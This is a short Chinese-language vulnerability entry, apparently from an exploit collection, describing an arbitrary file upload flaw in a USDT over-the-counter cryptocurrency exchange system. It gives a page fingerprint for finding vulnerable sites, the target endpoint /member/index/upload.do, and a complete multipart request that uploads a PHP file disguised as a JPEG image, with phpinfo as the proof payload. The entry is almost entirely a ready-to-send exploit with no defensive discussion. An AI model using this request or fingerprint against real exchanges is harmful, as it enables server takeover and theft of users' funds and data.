# 虚拟币买卖USDT场外交易所upload.do存在任意文件上传漏洞

- **系统**：虚拟币买卖USDT场外交易所　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/static/weui/css/wkb.css"`
- **请求**：`POST /member/index/upload.do HTTP/1.1`
- **关键头**：`Content-Length: 197`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZcxuMaQ4…`　`Cookie: Hm_lvt_f4b3788b2247dd149fb7fdffe8aece79=1717334200; _ga=GA1.1.64233863.171733420…`　`Host: 127.0.0.1:81`

**请求体 / payload**
```
------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg
<?php phpinfo();?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
```
- **预期**：200　|　—